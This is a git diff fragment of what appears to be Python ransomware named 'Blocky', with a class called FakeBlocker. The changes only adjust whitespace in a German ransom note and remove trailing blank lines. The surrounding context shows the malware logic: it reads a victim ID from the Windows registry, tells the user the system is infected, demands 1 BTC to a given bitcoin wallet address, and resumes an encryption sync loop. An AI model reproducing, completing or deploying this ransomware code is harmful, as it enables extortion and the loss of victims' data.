@@ -83,7 +83,7 @@ class FakeBlocker:
             rnsm = Ransomware(resume=True)
             rnsm.victim_id = winreg.QueryValueEx(key, "ID")[0]
             print(
-                "\n Du bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\n Starte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt.\n"
+                "\nDu bist bereits mit der Blocky Ransomware infiziert!\n\nBitte nehme die Zahlung von 1 BTC an folgendes Wallet vor: bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\n\nStarte Blocky.exe erneut und lasse die Software laufen, sobald die Zahlung betätigt wurde. Deine Daten werden anschließend entschlüsselt.\n"
             )
             rnsm.sync_loop()
         except:
@@ -358,6 +358,3 @@ if __name__ == "__main__":
         main()
     # Start check if system is already infected or not
     blocky.initial_check()
-
-
-
